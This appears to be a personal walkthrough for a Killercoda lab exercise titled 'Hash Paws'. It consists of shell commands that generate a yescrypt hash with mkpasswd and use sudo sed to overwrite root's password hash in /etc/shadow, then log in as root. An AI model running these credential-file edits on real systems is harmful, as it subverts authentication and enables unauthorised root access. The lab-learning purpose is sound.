# Hash Paws (Killercoda)
# Getting (root) by modifying /etc/shadow - Local Privilege Escalation 

# LOL, get whois first, so you can get your string
sudo apt install whois

mkpasswd -m yescrypt "password123" # Boring example, but I used that.

# Put this into /etc/shadow
sudo sed -i 's|^root:[^:]*|root:<string here>|' /etc/shadow # yescrypt makes a new string, even if same password, so paste it

# Log in, use your string
su root

# New password help
sudo passwd root
